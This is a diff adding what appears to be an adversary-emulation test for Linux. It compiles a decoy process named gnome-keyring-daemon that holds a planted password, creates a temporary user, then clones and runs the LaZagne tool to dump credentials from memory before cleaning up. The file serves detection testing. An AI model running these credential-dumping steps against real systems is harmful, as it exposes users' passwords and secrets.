@@ -1,0 +1,43 @@
+attack_technique: Test
+display_name: Dump Memory for Credentials
+atomic_tests:
+- name: Test
+  description: Test
+  supported_platforms:
+    - linux
+    - containers
+  input_arguments:
+    Parent Directory:
+      description: Base path to the parent directory used for this test
+      type: Path
+      default: /tmp
+    Child Directory:
+      description: Name of the child directory used for this test
+      type: String
+      default: test_lazagne_dir
+    Username:
+      description: Name of the temporary user used for this test
+      type: String
+      default: test_user
+  dependencies:
+    - description: |
+        git installed
+      prereq_command: |
+        which git 1>/dev/null
+      get_prereq_command: |
+        apt-get update && apt-get -y install git
+  executor:
+    command: |
+      mkdir "#{Parent Directory}/#{Child Directory}" 2>/dev/null; cd "#{Parent Directory}/#{Child Directory}"
+      echo I2luY2x1ZGUgPHN0ZGlvLmg+CgppbnQgbWFpbigpCnsKICAgIGNoYXIgc1tdID0gIl9wYW1tb2R1dGlsX2dldHB3bmFtX1x4MDB0ZXN0X3Bhc3N3b3JkIjsKICAgIHNsZWVwKDYwKTsKICAgIAogICAgcmV0dXJuIDA7Cn0K | base64 -d > fake_proc.c
+      gcc fake_proc.c -o gnome-keyring-daemon -w
+      useradd -M -p '$y$j9T$uqL6JnhiHPUn656QPIAfs1$i74dzWKrCujibxkY7a.GXLq.wx7R0QNbvWTP0K2C8IB' "#{Username}" 2>/dev/null
+      git clone -q https://github.com/AlessandroZ/LaZagne 2>/dev/null
+      ./gnome-keyring-daemon & FAKE_PROC=$!
+      python3 LaZagne/Linux/laZagne.py memory
+      kill -9 $FAKE_PROC && wait $FAKE_PROC
+    cleanup_command: |
+      rm -r "#{Parent Directory}/#{Child Directory}"
+      userdel "#{Username}"
+    name: bash
+    elevation_required: true
